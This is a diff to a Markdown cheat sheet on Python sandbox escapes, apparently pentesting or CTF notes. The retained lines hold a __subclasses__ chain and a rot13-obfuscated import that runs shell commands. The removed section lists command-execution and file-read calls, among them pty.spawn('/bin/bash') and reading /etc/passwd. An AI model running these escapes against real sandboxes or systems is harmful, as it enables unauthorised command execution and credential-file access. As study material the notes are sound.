@@ -80,7 +80,7 @@ cmd = '''''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.f
 ## Defenses in a python sandbox
 
 1. Forbidden characters or input validation
-2. No builtins
+2. No builtins present
    * `exec('cmd', {'__builtins__': None})`
 3. Restriction on importing libraries 
    * `sys.modules['os'] = 'not allowed'`
@@ -114,43 +114,7 @@ cmd = '''''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.f
     * `f3ck = __import__("pbzznaqf".decode('rot_13'))` 
     * `print f3ck.getoutput('ifconfig')`
 
-## 2. Restricted system modules 
-
-* You can perform a task in multiple ways, below is a list of all different ways used to perform the same action.
-* [https://www.python-course.eu/os\_module\_shell.php](https://www.python-course.eu/os_module_shell.php)
-
-```python
-### Command execution and file read ##########################
-os.system("ls")
-os.popen("ls").read()
-commands.getstatusoutput("ls") 
-commands.getoutput("ls")
-commands.getstatus("file/path")
-subprocess.call("ls", shell=True)
-subprocess.Popen("ls", shell=True)
-pty.spawn("ls")
-pty.spawn("/bin/bash")
-platform.popen("ls").read()
-open("/etc/passwd").read()
-open('/var/www/html/input', 'w').write('123')
-
-
-### importing libraries ########################################
-# 1
-import os
-from os import *
-__import__('os').system("ls")
-
-# 2
-sys.modules["os"].system("ls")
-
-#3 - python2
-execfile('/usr/lib/python2.7/os.py')
-system('ls')
-
-```
-
-## Python Builtins
+## 2. No builtins present
 
 ### If Python builtins present
 
